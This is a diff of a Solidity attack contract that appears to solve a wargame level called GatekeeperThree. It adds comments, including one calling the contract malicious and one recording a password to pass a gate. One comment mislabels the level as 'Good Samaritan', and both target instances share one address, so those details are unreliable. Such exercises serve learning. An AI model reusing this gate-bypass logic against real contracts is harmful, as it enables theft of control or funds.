@@ -2,10 +2,17 @@
 pragma solidity ^0.8.0;
 import "../instances/Ilevel28.sol";
 
+/**
+ * @title AttackGateThree
+ * @author Kent Miguel
+ * @notice This is a malicious contract to take control of level28: Good Samaritan
+ */
 contract AttackGateThree {
+    //Instance of GateKeeper Three
     GatekeeperThree level28 =
         GatekeeperThree(payable(0xdcF3e321A839336d7ADDF6a217AcAB20CbF461E9));
 
+    //Instance of SimpleTrick
     SimpleTrick level28_trick =
         SimpleTrick(0xdcF3e321A839336d7ADDF6a217AcAB20CbF461E9);
 
@@ -21,8 +28,6 @@ contract AttackGateThree {
      */
     function passGateTwo(uint256 _password) external {
         level28.createTrick();
-
-        //need to know SimpleTrick contract target and trick values
 
         //call checkPassword first: pass password 1676644032
         level28.trick().checkPassword(_password);
